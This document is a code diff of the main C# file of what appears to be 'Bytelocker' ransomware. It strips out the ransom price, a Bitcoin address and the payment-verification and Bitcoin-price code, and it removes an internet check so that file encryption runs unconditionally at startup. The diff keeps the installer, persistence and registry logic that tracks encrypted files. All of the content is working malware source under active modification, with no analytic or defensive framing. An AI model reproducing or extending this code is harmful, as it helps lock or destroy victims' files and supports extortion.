@@ -1,5 +1,4 @@
 ﻿using Bytelocker.CryptoManager;
-using Bytelocker.CryptoPayment;
 using Bytelocker.Installer;
 using Bytelocker.Persistence;
 using Bytelocker.Settings;
@@ -16,8 +15,6 @@ namespace Bytelocker
 
         // max hours should be 99 days
         public static int TIME_TILL_REMOVAL_HOURS = 168;
-        public static int COST_TO_DECRYPT = 30;
-        public static String BITCOIN_ADDRESS = "3PZHWwbz37f9jtPibitfwqb978qKFCLV65";
 
         public static void Main(String[] args)
         {
@@ -33,21 +30,18 @@ namespace Bytelocker
                 //new Melt();
             }
 
-            if (NetworkTest.CheckForInternetConnection())
+            Encrypt();
+
+            // if no files have been encrypted, uninstall
+            if (rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null")
             {
-                Encrypt();
-
-                // if no files have been encrypted, uninstall
-                if (rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null")
-                {
-                    new Uninstall();
-                }
-                else
-                {
-                    LaunchWindow();
-                }
-
+                new Uninstall();
             }
+            else
+            {
+                LaunchWindow();
+            }
+
         }
 
         private static void Encrypt()
@@ -70,12 +64,6 @@ namespace Bytelocker
             new Uninstall();
         }
 
-        public static bool VerifyPayment(String transaction_id)
-        {
-            PaymentManager pm = new PaymentManager();
-            pm.SelectTransactionID(transaction_id);
-            return pm.VerifyPayment();
-        }
 
         [STAThread]
         private static void LaunchWindow()
@@ -85,11 +73,6 @@ namespace Bytelocker
             if (rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "t") == "none")
             {
                 rm.CreateStringValue(RegistryManager.SETTINGS_KEY_NAME, "t", B64Manager.ToBase64(DateTime.Now.ToString()));
-            }
-
-            if (rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "p") == "none")
-            {
-                rm.CreateStringValue(RegistryManager.SETTINGS_KEY_NAME, "p", B64Manager.ToBase64(PaymentManager.GetBitcoinPrice()));
             }
 
             MainWindow mw = new MainWindow();
